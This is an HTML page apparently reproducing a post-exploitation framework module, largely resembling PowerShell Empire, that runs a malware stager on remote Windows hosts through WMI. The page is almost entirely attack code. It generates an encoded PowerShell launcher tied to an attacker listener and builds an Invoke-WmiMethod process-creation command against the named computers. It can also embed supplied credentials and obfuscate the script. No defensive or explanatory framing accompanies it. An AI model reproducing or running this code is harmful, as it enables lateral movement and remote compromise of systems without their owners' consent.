<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>WMI</title>
</head><body>Executes a stager on remote hosts using WMI.<br/>
Does not need Admin<br/>
<br/>
script = &quot;&quot;&quot;$null = Invoke-WmiMethod -Path Win32_process -Name create&quot;&quot;&quot;<br/>
launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)<br/>
<br/>
      if launcher == &quot;&quot;:<br/>
        return &quot;&quot;<br/>
      else:<br/>
        stagerCode = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher<br/>
<br/>
        # build the WMI execution string<br/>
        computerNames = &quot;\&quot;&quot; + &quot;\&quot;,\&quot;&quot;.join(self.options['ComputerName']['Value'].split(&quot;,&quot;)) + &quot;\&quot;&quot;<br/>
<br/>
        script += &quot; -ComputerName @(&quot;+computerNames+&quot;)&quot;<br/>
        script += &quot; -ArgumentList \&quot;&quot; + stagerCode + &quot;\&quot;&quot;<br/>
<br/>
        # if we're supplying alternate user credentials<br/>
        if userName != '':<br/>
          script = &quot;$PSPassword = \&quot;&quot;+password+&quot;\&quot; | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\&quot;&quot;+userName+&quot;\&quot;,$PSPassword);&quot; + script + &quot; -Credential $Credential&quot;<br/>
<br/>
        script += &quot;;'Invoke-Wmi executed on &quot; +computerNames +&quot;'&quot;<br/>
      if obfuscate:<br/>
script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)</body></html>